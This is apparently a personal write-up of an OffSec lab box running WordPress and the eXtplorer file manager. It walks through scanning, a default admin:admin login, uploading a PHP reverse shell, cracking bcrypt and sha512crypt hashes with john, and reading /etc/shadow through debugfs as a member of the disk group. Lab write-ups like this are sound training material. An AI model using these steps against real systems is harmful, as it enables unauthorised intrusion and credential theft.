## Initial Foothold

Autorecon 192.168.207.16
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://192.168.207.16/wp-admin/setup-config.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Ports
- 80 (web) - We got redirected to wordpress `setup-config` site and tried using `admin:admin` as credentials to set up a database but apparently that is not the right login information

Since this is a wordpress site, we would want to `wpscan`
```
┌──(kali㉿kali)-[~/offsec/Extplorer]
└─$ wpscan --url http://192.168.228.16 --plugins-detection aggressive --disable-tls-checks
Interesting Finding(s):             

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.228.16/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.2 identified (Insecure, released on 2023-03-29).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://192.168.228.16/wp-includes/css/dashicons.min.css?ver=6.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://192.168.228.16/wp-includes/css/buttons.min.css?ver=6.2
 |  Style Etag (Aggressive Detection)
 |   - http://192.168.228.16/wp-admin/load-styles.php, Match: '6.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:14:47 <======================================================================> (139508 / 139508) 100.00% Time: 00:14:47
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.228.16/wp-content/plugins/akismet/
 | Version: 5.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.228.16/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.228.16/wp-content/plugins/akismet/readme.txt
[+] https://github.com/placetopay/woocommerce-gateway-placetopay
 | Location: http://192.168.228.16/wp-content/plugins/https://github.com/placetopay/woocommerce-gateway-placetopay/
 | Found By: Known Locations (Aggressive Detection)
 |  - https://github.com/placetopay/woocommerce-gateway-placetopay/, status: 200

┌──(kali㉿kali)-[~/offsec/Extplorer]
└─$ wpscan --url http://192.168.228.16 --enumerate ap,u,t --disable-tls-checks
[i] No Users Found.
```
Feroxbuster to find a `/filemanager` directory.
```
http://192.168.228.16/filemanager/README.txt
http://192.168.228.16/filemanager/copyright
...
http://192.168.228.16/filemanager/CHANGELOG.TXT
```

CHANGELOG.txt
```
****************************
Changelog for eXtplorer
****************************
--- version 2.1.15 ---
- fixed a critical security issue reported by shimmeris
- PHP 8 compatibility

--- version 2.1.14 ---
- fixed various security issues reported by Sander Bos:
- fixed deprecated warnings on PHP 7.4

--- version 2.1.13 ---
- fixed various security issues reported by Mario Korth:
  * potential XSS 
  * Arbitrary file read
  * Path traversal in listing directory contents
  * Path traversal in archive feature
- added new turkish translations 
...
...
```

The version for eXtplorer is 2.1.15 but the exploit on exploitdb is for <=2.1.14 but I think it's still worth a try.
`http://192.168.228.16/filemanager/copyright`. Did not work despite changing the below two lines.
```
# line 55
ver = re.findall(r"<version>(((\d+)\.?)+)</version>", raw.string, re.MULTILINE)

# line 57
if int(ver[0][2]) <= 15:

# line 116
token = re.findall(r'token:\s"([a-f0-9]{32})"', tokenReq.text)[0]
```

```
└─$ python3 extplorer-exploit.py -t http://192.168.228.16/filemanager -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

LOL we login to eXtplorer with credentials `admin:admin`.
From github, `https://github.com/advisories/GHSA-9337-wvr6-wx8x`
```
eXtplorer 2.1.15 is vulnerable to Insecure Permissions. File upload in file manager allows uploading zip file containing php pages with arbitrary code executions.
```

Tried uploading `php-reverse-shell.zip` and traversing to that page. Did not work. Ended up just uploading `php-reverse-shell.php` and that worked.

Caught shell on penelope port 4444. User `dora`.
## Privesc
- `sudo -l` - Cannot because we are `www-data`
- Check SUID - nothing except pkexec which means pwnkit probably works.
- Check capabilities - nothing much

Run linpeas.sh. Nothing interesting besides a bunch of kernel exploit. Sure we can use pwnkit and dirtyfrag but I want to find the intended way.

grep for dora credentials
```
grep -rnIiE "dora" /var/www/html
...
...
/var/www/html/filemanager/config/.htusers.php:6:        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
```

```
┌──(kali㉿kali)-[~/offsec/Extplorer]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash         
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
```

Obtained `dora:doraemon` credentials. su dora.
- `sudo -l` - Sorry, user dora may not run sudo on localhost.
- Check SUID - nothing except pkexec which means pwnkit probably works.
- Check capabilities - nothing much

```
dora@dora:/$ id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

`https://hacktricks.wiki/en/linux-hardening/user-information/interesting-groups-linux-pe/index.html`

From hacktricks, we can use `debugfs` to enumerate disk with root level privileges where we can read and write to any files.

Their version
```
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Our version
```
dora@dora:/$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.8G  3.6G  62% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000

debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cat /root/.ssh/id_rsa
/root/.ssh/id_rsa: File not found by ext2_lookup 
debugfs:  cd /root
debugfs:  cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
...
...
debugfs:  cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
...
```

Crack `root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::`

```
┌──(kali㉿kali)-[~/offsec/Extplorer]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash_root
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
explorer         (root)     
```

su root. 